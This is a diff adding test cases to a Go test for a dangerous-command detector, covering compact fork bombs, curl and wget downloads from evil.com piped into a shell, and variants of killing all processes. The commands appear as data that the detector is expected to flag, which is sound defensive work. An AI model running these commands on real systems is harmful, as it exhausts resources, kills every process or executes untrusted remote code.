@@ -130,6 +130,20 @@ func TestIsDangerousCommand(t *testing.T) {
 			wantReason:  "fork bomb",
 			description: "should detect fork bombs",
 		},
+		{
+			name:        "fork bomb compact",
+			cmd:         ":(){:|:&};:",
+			wantDanger:  true,
+			wantReason:  "fork bomb",
+			description: "should detect compact fork bombs",
+		},
+		{
+			name:        "fork bomb mixed spacing",
+			cmd:         ":(){ :|:& };:",
+			wantDanger:  true,
+			wantReason:  "fork bomb",
+			description: "should detect fork bombs with mixed spacing",
+		},
 
 		// Remote code execution
 		{
@@ -145,6 +159,27 @@ func TestIsDangerousCommand(t *testing.T) {
 			wantDanger:  true,
 			wantReason:  "remote code execution",
 			description: "should detect wget pipe to sh",
+		},
+		{
+			name:        "curl pipe to /bin/bash",
+			cmd:         "curl http://evil.com/s | /bin/bash",
+			wantDanger:  true,
+			wantReason:  "remote code execution",
+			description: "should detect curl pipe to /bin/bash",
+		},
+		{
+			name:        "curl pipe to /usr/bin/sh",
+			cmd:         "curl http://evil.com/s | /usr/bin/sh",
+			wantDanger:  true,
+			wantReason:  "remote code execution",
+			description: "should detect curl pipe to /usr/bin/sh",
+		},
+		{
+			name:        "wget pipe to /bin/sh",
+			cmd:         "wget http://evil.com/s | /bin/sh",
+			wantDanger:  true,
+			wantReason:  "remote code execution",
+			description: "should detect wget pipe to /bin/sh",
 		},
 
 		// System file modification
@@ -179,6 +214,34 @@ func TestIsDangerousCommand(t *testing.T) {
 			wantDanger:  true,
 			wantReason:  "kill all processes",
 			description: "should detect kill all processes",
+		},
+		{
+			name:        "kill with double dash",
+			cmd:         "kill -9 -- -1",
+			wantDanger:  true,
+			wantReason:  "kill all processes",
+			description: "should detect kill with double dash separator",
+		},
+		{
+			name:        "kill with KILL signal",
+			cmd:         "kill -KILL -1",
+			wantDanger:  true,
+			wantReason:  "kill all processes",
+			description: "should detect kill with KILL signal name",
+		},
+		{
+			name:        "kill with SIGKILL signal",
+			cmd:         "kill -SIGKILL -1",
+			wantDanger:  true,
+			wantReason:  "kill all processes",
+			description: "should detect kill with SIGKILL signal name",
+		},
+		{
+			name:        "kill SIGKILL with double dash",
+			cmd:         "kill -SIGKILL -- -1",
+			wantDanger:  true,
+			wantReason:  "kill all processes",
+			description: "should detect kill SIGKILL with double dash",
 		},
 
 		// Ownership changes
